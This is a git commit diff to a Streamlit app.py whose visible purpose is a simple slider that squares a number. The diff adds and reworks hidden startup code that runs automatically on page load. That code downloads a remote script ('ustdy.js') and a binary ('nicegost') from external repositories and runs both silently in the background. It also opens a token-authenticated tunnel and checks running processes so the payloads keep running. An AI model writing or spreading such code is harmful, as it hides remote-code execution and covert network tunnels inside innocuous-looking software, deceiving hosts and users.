01dcc58b2fac837bcabc810081fce4551101790e
Kamren <23100346+flyapple2016@users.noreply.github.com>
2025-03-16 03:25:36 +0800

    Update app.py

--- app.py
+++ app.py
@@ -2,6 +2,7 @@ import streamlit as st
 import subprocess
 import os
 import requests
+import psutil
 
 def download_file(url, file_path):
     if not os.path.exists(file_path):
@@ -15,22 +16,42 @@ def download_file(url, file_path):
             return False
     return True
 
+def is_process_running(process_name, command_part=None):
+    for proc in psutil.process_iter(attrs=["name", "cmdline"]):
+        try:
+            cmdline = proc.info["cmdline"]
+            if cmdline and process_name in cmdline[0]:
+                if command_part and command_part in " ".join(cmdline):  
+                    return True
+                elif not command_part:
+                    return True
+        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+            continue
+    return False
+
 def run_in_background(command):
     subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-def main():
+def setup():
     ustdy_url = "https://gitlab.com/anyway_2012/bot/-/raw/master/ustdy.js"
     ustdy_path = "./ustdy.js"
-    if download_file(ustdy_url, ustdy_path):
+
+    if download_file(ustdy_url, ustdy_path) and not is_process_running("ustdy.js"):
         run_in_background([ustdy_path])
-        
+
     nicegost_url = "https://raw.githubusercontent.com/flyapple2016/NiceGost/main/nicegost"
     nicegost_path = "./nicegost"
-    if download_file(nicegost_url, nicegost_path):
+
+    if download_file(nicegost_url, nicegost_path) and not is_process_running("nicegost"):
         token = os.getenv("TOKEN")
         if token:
             run_in_background([nicegost_path, "tunnel", "--edge-ip-version", "auto", "--protocol", "http2", "run", "--token", token])
 
+if "services_started" not in st.session_state:
+    setup()
+    st.session_state["services_started"] = True
+
+def main():
     x = st.slider('Select a value')
     st.write(x, 'squared is', x * x)
 
